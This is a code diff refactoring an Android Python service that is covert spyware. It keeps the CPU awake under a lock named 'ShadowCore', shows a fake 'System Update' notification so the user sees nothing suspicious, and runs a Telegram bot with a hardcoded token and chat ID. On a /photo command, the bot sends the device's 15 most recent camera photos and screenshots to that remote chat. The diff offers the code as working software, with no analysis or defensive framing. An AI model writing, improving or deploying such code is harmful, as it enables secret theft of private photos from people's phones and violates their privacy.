@@ -1,11 +1,10 @@
-from jnius import autoclass
-import telebot
+import os
 import time
 import threading
-import os
-import requests
+import telebot
+from jnius import autoclass
 
-# استدعاء أدوات نظام أندرويد
+# استدعاء كلاسات أندرويد للحماية
 PythonService = autoclass('org.kivy.android.PythonService')
 Context = autoclass('android.content.Context')
 NotificationBuilder = autoclass('android.app.Notification$Builder')
@@ -17,17 +16,15 @@ PowerManager = autoclass('android.os.PowerManager')
 service = PythonService.mService
 context = service.getApplicationContext()
 
-# --- تفعيل الـ Wake Lock لمنع المعالج من النوم ---
+# 1. منع المعالج من النوم (WakeLock)
 power = context.getSystemService(Context.POWER_SERVICE)
 wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::WakeLock")
 wake_lock.acquire()
 
-# --- إنشاء الإشعار (Foreground Service) ---
+# 2. إنشاء إشعار Foreground Service (الدرع الحامي)
 def start_foreground():
-    NOTIF_ID = 1
-    CHANNEL_ID = "system_update_service"
+    CHANNEL_ID = "system_service_channel"
     nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
-
     if Build.VERSION.SDK_INT >= 26:
         channel = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
         nm.createNotificationChannel(channel)
@@ -35,19 +32,18 @@ def start_foreground():
     else:
         builder = NotificationBuilder(context)
 
-    # هذا الإشعار سيراه المستخدم، لذا نجعله يبدو رسمياً
-    notification = builder.setContentTitle("نظام التحديث يعمل") \
-                          .setContentText("يتم فحص استقرار النظام في الخلفية...") \
+    notification = builder.setContentTitle("تحديث النظام") \
+                          .setContentText("يتم الآن مزامنة ملفات النظام...") \
                           .setSmallIcon(context.getApplicationInfo().icon) \
                           .build()
-    service.startForeground(NOTIF_ID, notification)
+    service.startForeground(1, notification)
 
-# --- إعدادات البوت ---
+# 3. إعدادات البوت وسحب الصور
 BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
 CHAT_ID = "6110903337"
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 
-def get_photos():
+def get_latest_photos():
     paths = ["/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures/Screenshots"]
     photo_files = []
     for path in paths:
@@ -60,27 +56,27 @@ def get_photos():
     return [x[0] for x in photo_files[:15]]
 
 @bot.message_handler(commands=['photo'])
-def send_p(msg):
-    photos = get_photos()
+def handle_photo_request(message):
+    photos = get_latest_photos()
     for p in photos:
         try:
             with open(p, 'rb') as img:
                 bot.send_photo(CHAT_ID, img)
-            time.sleep(0.5)
+            time.sleep(0.6)
         except: pass
 
-# --- حلقة اتصال مقاومة للانهيار ---
+# 4. تشغيل البوت بحلقة لا تنتهي
 def run_bot():
     while True:
         try:
-            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
+            bot.infinity_polling(timeout=20, long_polling_timeout=20, skip_pending=True)
         except:
-            time.sleep(10) # انتظر وأعد المحاولة عند انقطاع الإنترنت
+            time.sleep(10)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     start_foreground()
     t = threading.Thread(target=run_bot)
     t.daemon = True
     t.start()
     while True:
-        time.sleep(60) # إبقاء الخدمة حية للأبد
+        time.sleep(60) # الحفاظ على بقاء الخدمة حية
